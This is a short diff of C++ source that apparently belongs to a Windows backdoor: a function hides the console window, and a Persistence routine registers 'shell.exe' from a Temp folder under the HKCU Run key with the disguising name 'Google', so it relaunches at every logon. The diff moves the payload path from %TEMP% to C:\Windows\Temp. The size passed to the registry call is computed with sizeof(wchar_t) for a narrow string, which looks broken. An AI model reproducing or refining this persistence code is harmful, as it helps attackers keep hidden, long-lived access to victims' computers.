@@ -13,8 +13,9 @@ void HideConsole()
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
 
+
 void Persistence() {
-    std::string progPath = "%TEMP%\\shell.exe";
+    std::string progPath = "C:\\Windows\\Temp\\shell.exe";
     HKEY hkey = NULL;
     LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
     LONG status = RegSetValueEx(hkey, "Google", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
